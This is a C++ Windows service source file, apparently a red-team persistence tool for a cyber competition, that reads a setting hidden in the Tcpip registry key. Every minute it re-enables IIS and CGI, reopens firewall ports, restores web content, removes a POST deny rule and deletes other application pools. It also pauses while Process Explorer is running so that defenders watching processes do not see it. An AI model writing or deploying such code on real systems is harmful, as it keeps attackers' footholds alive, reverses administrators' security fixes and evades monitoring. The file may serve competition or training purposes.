#include "Service.h"
#include "Persistence.h"
#include <iostream>
#include <thread>
#include <chrono>
#include <format>
#include <fstream>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// Initialize static members
SERVICE_STATUS ServiceController::ServiceStatus;
SERVICE_STATUS_HANDLE ServiceController::HandleStatus;
std::atomic<bool> ServiceController::g_ServiceRunning(true);
std::wstring ServiceController::Competition;

// Converts wStrings to strings
std::string ServiceController::WStringToString(const std::wstring& wstr) {
    return std::string(wstr.begin(), wstr.end());
}

int ServiceController::findProcess(const wchar_t* procname) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;

    // snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // initializing size: needed for using Process32First
    pe.dwSize = sizeof(PROCESSENTRY32);

    // info about first process encountered in a system snapshot
    hResult = Process32First(hSnapshot, &pe);

    // retrieve information about the processes
    // and exit if unsuccessful
    while (hResult) {
        // if we find the process: return process ID
        if (wcscmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    // closes an open handle (CreateToolhelp32Snapshot)
    CloseHandle(hSnapshot);
    return pid;
}

void WINAPI ServiceController::ServiceControlHandler(DWORD dwControl)
{
    switch (dwControl)
    {
    case SERVICE_CONTROL_STOP:
        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(HandleStatus, &ServiceStatus);
        ServiceStatus.dwWaitHint = 60000; // 60 second timeout
        g_ServiceRunning = false;
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        ServiceStatus.dwWaitHint = 3000; // 3 second timeout
        SetServiceStatus(HandleStatus, &ServiceStatus);
        g_ServiceRunning = false;
        break;
    case SERVICE_CONTROL_PAUSE:
        ServiceStatus.dwCurrentState = SERVICE_PAUSED;
        break;
    case SERVICE_CONTROL_CONTINUE:
        ServiceStatus.dwCurrentState = SERVICE_RUNNING;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        ServiceStatus.dwCurrentState = SERVICE_INTERROGATE;
        break;
    default:
        break;
    }

    // Always update status unless it's STOP_PENDING
    if (ServiceStatus.dwCurrentState != SERVICE_STOP_PENDING) {
        SetServiceStatus(HandleStatus, &ServiceStatus);
    }
}

void WINAPI ServiceController::ServiceMain(DWORD argc, LPWSTR* argv) {
    // SERVICE CODE HERE
    HandleStatus = RegisterServiceCtrlHandlerW(SERVICE_NAME, (LPHANDLER_FUNCTION)ServiceControlHandler);
    if (HandleStatus == NULL) {
        return;
    }

    // Initialize service status
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = NO_ERROR;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(HandleStatus, &ServiceStatus);

    // Set default competition parameter
    Competition = L"Competition_Website";

    // Try to get from registry
    HKEY hkey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\Tcpip", 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
        wchar_t competitionValue[256];
        DWORD dwSize = sizeof(competitionValue);
        if (RegQueryValueExW(hkey, L"Competition", NULL, NULL, (LPBYTE)competitionValue, &dwSize) == ERROR_SUCCESS) {
            Competition = competitionValue;
        }
        RegCloseKey(hkey);
    }

    persistenceController Persistence;

    // Construct paths using wide strings
    std::wstring fullWebBackupPath = Persistence.backupWebPath + Competition;
    std::wstring fullWebLivePath = Persistence.liveWebPath + Competition;
    std::wstring fullPHPBackupPath = Persistence.backupPHPPath;
    std::wstring fullPHPLivePath = Persistence.livePHPPath;

    // Report running status
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(HandleStatus, &ServiceStatus);

    while (g_ServiceRunning) {
        // Restores IIS
        Persistence.RestoreIIS();

        // Restores Firewall Ports
        Persistence.OpenPorts();

        // Restore web content
        Persistence.RestoreBackupsWeb(WStringToString(fullWebBackupPath), WStringToString(fullWebLivePath));

        // Restore PHP content
        Persistence.RestoreBackupsPHP(WStringToString(fullPHPBackupPath), WStringToString(fullPHPLivePath));

        // Ensure CGI is installed and enabled
        Persistence.RestoreCGI();

        // Configure CGI Paths and Handlers
        Persistence.RestoreCGIHandlers(WStringToString(Competition));

        // Remove POST Deny Rule
        Persistence.RemovePostDenyRule(WStringToString(Competition));

        // Delete other AppPools
        Persistence.DeleteOtherAppPools(WStringToString(Competition));

        // Restore AppPool
        Persistence.RestoreAppPool(WStringToString(Competition));

        int counter = 0;
        while (findProcess(L"procexp") != 0 || findProcess(L"procexp64") != 0) {
            if (counter == 15) { // If 15 minutes have passed and process explorer is still running, run
                break;
            }
            std::this_thread::sleep_for(std::chrono::minutes(1)); // Otherwise check again in a minute
            counter++;
        }
        std::this_thread::sleep_for(std::chrono::minutes(1)); // Executes every minute if Process Explorer is not open
    }

    // Stop Service
    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(HandleStatus, &ServiceStatus);
}